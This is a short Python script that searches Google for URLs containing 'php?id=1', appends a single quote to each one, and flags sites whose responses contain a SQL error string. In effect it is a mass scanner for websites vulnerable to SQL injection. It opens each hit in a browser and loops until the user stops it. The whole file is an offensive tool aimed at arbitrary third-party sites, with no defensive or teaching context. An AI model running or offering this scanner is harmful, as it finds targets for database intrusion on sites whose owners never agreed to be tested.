import requests
import webbrowser
from googlesearch import search

kay = "php?id=1"
kay1 = "'"

for url in search(kay,stop=100):
  try:
    req = requests.get(url+kay1)
    msg = "your SQL"
    if msg in req.text:
      print("sql found")
      print(url)
      webbrowser.open(url)
      inp = input("Do you compliet Y/N: ")
      if inp == 'y' or inp == 'Y':
        break;
    else:
      print("no sql")
  except:
    print("internet!!!!")
